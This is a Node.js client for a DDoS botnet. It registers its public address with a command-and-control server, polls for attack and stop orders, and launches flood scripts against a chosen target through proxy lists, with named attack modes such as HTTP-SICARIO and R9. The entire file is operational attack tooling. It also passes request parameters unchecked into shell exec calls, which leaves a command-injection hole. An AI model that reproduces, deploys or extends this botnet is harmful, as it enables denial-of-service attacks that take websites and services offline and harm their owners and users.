const express = require('express');
const { exec } = require('child_process');
const axios = require('axios');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5552;

// Master server URL - your Render deployment
const MASTER_SERVER = process.env.MASTER_SERVER || 'https://new2-9ho5.onrender.com';

let myBotUrl = '';
let registrationAttempts = 0;
const MAX_REGISTRATION_ATTEMPTS = 5;
let activeProcesses = []; // Track active attack processes
let isBlocked = false; // Track if bot is blocked by server

async function fetchData() {
  try {
    const response = await fetch('https://httpbin.org/get');
    const data = await response.json();
    myBotUrl = `http://${data.origin}:${port}`;
    
    console.log('\n========================================');
    console.log('🤖 Auto-Register Bot Client Started!');
    console.log('========================================');
    console.log(`📍 Local:    http://localhost:${port}`);
    console.log(`🌐 Network:  ${myBotUrl}`);
    console.log('========================================');
    console.log(`🎯 Master Server: ${MASTER_SERVER}`);
    console.log(`🔄 Auto-registration: ENABLED`);
    console.log('========================================\n');
    
    return data;
  } catch (error) {
    myBotUrl = `http://localhost:${port}`;
    console.log(`🤖 Bot running at ${myBotUrl}`);
    console.log(`🎯 Master Server: ${MASTER_SERVER}`);
  }
}

// Auto-register with master server
async function autoRegister() {
  if (isBlocked) {
    console.log(`[BLOCKED] This bot has been permanently blocked by the server`);
    console.log(`[INFO] Bot will not attempt to reconnect`);
    console.log(`[INFO] Contact server admin to unblock: ${myBotUrl}`);
    process.exit(0); // Exit the bot
  }

  if (registrationAttempts >= MAX_REGISTRATION_ATTEMPTS) {
    console.log(`[WARN] Max registration attempts reached. Will retry in 60s...`);
    setTimeout(() => {
      registrationAttempts = 0;
      autoRegister();
    }, 60000);
    return;
  }

  try {
    console.log(`[INFO] Auto-registering with master server... (Attempt ${registrationAttempts + 1}/${MAX_REGISTRATION_ATTEMPTS})`);
    
    const response = await axios.post(`${MASTER_SERVER}/register`, {
      url: myBotUrl
    }, {
      timeout: 10000,
      headers: {
        'Content-Type': 'application/json'
      }
    });

    if (response.data.approved) {
      console.log(`[SUCCESS] ✅ Auto-approved by master server!`);
      console.log(`[INFO] Bot registered at: ${myBotUrl}`);
      console.log(`[INFO] Ready to receive attack commands!`);
      
      // Send heartbeat every 30 seconds to stay connected
      setInterval(() => {
        sendHeartbeat();
      }, 30000);
      
      return;
    }
  } catch (error) {
    // Check if bot is blocked (403 status)
    if (error.response && error.response.status === 403) {
      console.log(`\n========================================`);
      console.log(`[BLOCKED] ❌ This bot has been permanently blocked!`);
      console.log(`========================================`);
      console.log(`Bot URL: ${myBotUrl}`);
      console.log(`Reason: Server administrator blocked this bot`);
      console.log(`\nContact server admin to unblock this bot.`);
      console.log(`========================================\n`);
      isBlocked = true;
      process.exit(0); // Exit the bot
      return;
    }

    registrationAttempts++;
    console.error(`[ERROR] Registration failed: ${error.message}`);
    console.log(`[INFO] Retrying in 5 seconds...`);
    
    setTimeout(() => {
      autoRegister();
    }, 5000);
  }
}

// Send heartbeat to master to keep connection alive
async function sendHeartbeat() {
  try {
    await axios.get(`${MASTER_SERVER}/ping`, { timeout: 5000 });
    // Also check for pending commands
    checkForCommands();
  } catch (error) {
    console.log(`[WARN] Heartbeat failed, re-registering...`);
    registrationAttempts = 0;
    autoRegister();
  }
}

// Poll for commands from master (pull-based system)
async function checkForCommands() {
  try {
    const response = await axios.get(`${MASTER_SERVER}/get-command`, {
      params: { botUrl: myBotUrl },
      timeout: 5000
    });

    if (response.data.hasCommand) {
      const command = response.data.command;
      
      if (command.action === 'stop') {
        console.log(`\n[STOP-RECEIVED] Stopping all attacks`);
        stopAllAttacks();
      } else if (command.action === 'attack') {
        const { target, time, methods } = command;
        console.log(`\n[COMMAND-RECEIVED] ${methods} -> ${target} for ${time}s`);
        executeAttack(target, time, methods);
      }
    }
  } catch (error) {
    // Silently fail - will retry on next heartbeat
  }
}

// Stop all running attacks
function stopAllAttacks() {
  console.log(`[STOP] Killing ${activeProcesses.length} active processes`);
  
  activeProcesses.forEach(proc => {
    try {
      process.kill(-proc.pid); // Kill process group
      console.log(`[KILLED] Process ${proc.pid}`);
    } catch (error) {
      console.error(`[ERROR] Failed to kill process ${proc.pid}: ${error.message}`);
    }
  });
  
  activeProcesses = [];
  console.log(`[STOP] All attacks stopped`);
}

// Execute attack methods
function executeAttack(target, time, methods) {
  const execWithLog = (cmd) => {
    console.log(`[EXEC] ${cmd}`);
    const proc = exec(cmd, { detached: true }, (error, stdout, stderr) => {
      if (error) {
        console.error(`[ERROR] ${error.message}`);
        return;
      }
      if (stdout) console.log(`[OUTPUT] ${stdout}`);
      if (stderr) console.error(`[STDERR] ${stderr}`);
    });
    
    // Track the process so we can kill it later
    activeProcesses.push(proc);
    
    // Auto-cleanup after attack duration
    setTimeout(() => {
      const index = activeProcesses.indexOf(proc);
      if (index > -1) {
        activeProcesses.splice(index, 1);
      }
    }, parseInt(time) * 1000 + 5000); // Add 5s buffer
  };

  if (methods === 'HTTP-SICARIO') {
    console.log('✅ Executing HTTP-SICARIO');
    execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
    execWithLog(`node methods/cibi.js ${target} ${time} 16 3 proxy.txt`);
    execWithLog(`node methods/BYPASS.js ${target} ${time} 32 2 proxy.txt`);
    execWithLog(`node methods/nust.js ${target} ${time} 12 4 proxy.txt`);
  } 
  else if (methods === 'RAW-HTTP') {
    console.log('✅ Executing RAW-HTTP');
    execWithLog(`node methods/h2-nust ${target} ${time} 15 2 proxy.txt`);
    execWithLog(`node methods/http-panel.js ${target} ${time}`);
  } 
  else if (methods === 'R9') {
    console.log('✅ Executing R9');
    execWithLog(`node methods/high-dstat.js ${target} ${time} 32 7 proxy.txt`);
    execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
    execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
    execWithLog(`node methods/nust.js ${target} ${time} 16 2 proxy.txt`);
    execWithLog(`node methods/BYPASS.js ${target} ${time} 8 1 proxy.txt`);
  } 
  else if (methods === 'PRIV-TOR') {
    console.log('✅ Executing PRIV-TOR');
    execWithLog(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);
    execWithLog(`node methods/high-dstat.js ${target} ${time} 16 2 proxy.txt`);
    execWithLog(`node methods/cibi.js ${target} ${time} 12 4 proxy.txt`);
    execWithLog(`node methods/BYPASS.js ${target} ${time} 10 4 proxy.txt`);
    execWithLog(`node methods/nust.js ${target} ${time} 10 1 proxy.txt`);
  } 
  else if (methods === 'HOLD-PANEL') {
    console.log('✅ Executing HOLD-PANEL');
    execWithLog(`node methods/http-panel.js ${target} ${time}`);
  } 
  else if (methods === 'R1') {
    console.log('✅ Executing R1');
    execWithLog(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);
    execWithLog(`node methods/high-dstat.js ${target} ${time} 64 2 proxy.txt`);
    execWithLog(`node methods/cibi.js ${target} ${time} 4 2 proxy.txt`);
    execWithLog(`node methods/BYPASS.js ${target} ${time} 16 2 proxy.txt`);
    execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
    execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
    execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
    execWithLog(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);
  }
}

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ 
    status: 'online', 
    timestamp: Date.now(),
    master: MASTER_SERVER,
    bot: 'ready',
    uptime: process.uptime()
  });
});

// Ping endpoint
app.get('/ping', (req, res) => {
  res.json({ 
    alive: true,
    uptime: process.uptime(),
    timestamp: Date.now()
  });
});

// Receive attack commands from master server (kept for backward compatibility)
app.get('/attack', (req, res) => {
  const { target, time, methods } = req.query;

  if (!target || !time || !methods) {
    return res.status(400).json({
      error: 'Missing parameters',
      required: ['target', 'time', 'methods']
    });
  }

  console.log(`\n[RECEIVED] ${methods} -> ${target} for ${time}s`);

  res.status(200).json({
    message: 'Attack command received. Executing methods now.',
    target,
    time,
    methods,
    bot: 'executing',
    timestamp: Date.now()
  });

  executeAttack(target, time, methods);
});

app.listen(port, async () => {
  await fetchData();
  
  // Wait 3 seconds then auto-register
  console.log('[INFO] Starting auto-registration in 3 seconds...\n');
  setTimeout(() => {
    autoRegister();
  }, 3000);
});
